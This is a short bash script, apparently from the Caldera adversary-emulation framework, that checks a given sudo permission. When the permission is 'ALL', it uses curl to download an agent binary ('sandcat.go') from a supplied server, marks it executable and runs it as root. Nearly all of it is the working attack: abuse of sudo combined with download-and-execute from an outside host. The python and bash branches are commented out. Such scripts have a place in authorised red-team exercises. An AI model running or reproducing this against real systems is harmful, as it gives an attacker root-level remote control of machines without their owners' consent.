#!/bin/bash

SUDOCOMMAND=$1
server=$2
grab="curl -svkOJ -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download 2>&1 | grep -i 'Content-Disposition' | grep -io 'filename=.*' | cut -d'=' -f2 | tr -d '\"\r'\""
spawn="agent=\$($grab) && chmod +x $agent 2>/dev/null && ./$agent -server $server -sleep 5 -v;"

echo $spawn

echo "Verifying if $SUDOCOMMAND is exploitable..."

case $SUDOCOMMAND in

  ALL)
    echo 'EXPLOITING...'
    sudo bash -c "$spawn"
    echo 'DONE'
    ;;

  /bin/python)
    echo python
    #sudo python -c "import pyt; pty.spawn($COMMAND);"
    ;;

  /bin/bash)
    echo bash
    #sudo bash -c "$COMMAND"
    ;;

  *)
    echo "$SUDOCOMMAND is not exploitable"
esac